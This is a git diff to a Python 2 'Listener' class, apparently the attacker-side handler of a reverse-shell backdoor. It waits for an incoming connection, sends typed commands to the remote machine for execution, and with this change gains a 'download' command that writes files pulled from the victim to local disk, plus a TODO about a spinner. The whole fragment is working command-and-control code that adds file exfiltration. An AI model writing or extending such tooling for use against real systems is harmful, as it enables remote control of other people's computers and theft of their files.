@@ -12,6 +12,7 @@ class Listener:
         listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener_socket.bind((ip_address, port))
         listener_socket.listen(0)
+        # TODO: implement loading animation with spinner (progress lib)
         print("[+] Waiting for incoming connection...")
         self.connection, address = listener_socket.accept()
         print("[+] Connection established! Source: " + str(address))
@@ -36,11 +37,18 @@ class Listener:
             exit()
         return self.reliable_receive()
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Download successful."
+
     def run(self):
         while True:
             command = raw_input(" >> ")
             command = command.split()
             result = self.execute_remotely(command)
+            if command[0] == "download":
+                result = self.write_file(command[1], result)
             print(result)
 
 
